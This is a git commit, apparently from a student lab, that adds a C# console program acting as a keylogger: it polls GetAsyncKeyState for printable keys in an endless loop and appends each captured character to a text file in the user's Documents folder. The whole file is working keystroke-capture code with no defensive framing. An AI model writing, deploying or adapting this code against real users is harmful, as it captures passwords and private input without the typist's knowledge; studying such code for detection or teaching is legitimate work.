46d3c08ad2fa13618aafaad43500c481694ea8be
Ex7ARZ <56121801+Ex7ARZ@users.noreply.github.com>
2020-06-05 17:35:43 +0300

    correct

---
+++ lab4/Program.cs
@@ -0,0 +1,52 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace lab._4
+{
+    class Program
+    {
+        [DllImport("User32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
+       // static string kelLog = "";
+
+        static void Main(string[] args)
+        {
+            String file = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            if (!Directory.Exists(file))
+            {
+                Directory.CreateDirectory(file);
+            }
+
+            String path = (file + @"\fileprog.txt");
+
+            if (!File.Exists(path))
+            {
+                using (StreamWriter sw = File.CreateText(path))
+                {
+                   
+                }
+            }
+            Console.Clear();
+            while (true)
+            {
+                Thread.Sleep(120);
+
+                for (int i = 32; i < 127; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+                    if (keyState !=0) 
+                    {
+                        Console.Write((char) i + ";");
+                        using (StreamWriter sw = File.AppendText(path))
+                        {
+                            sw.Write((char) i);
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
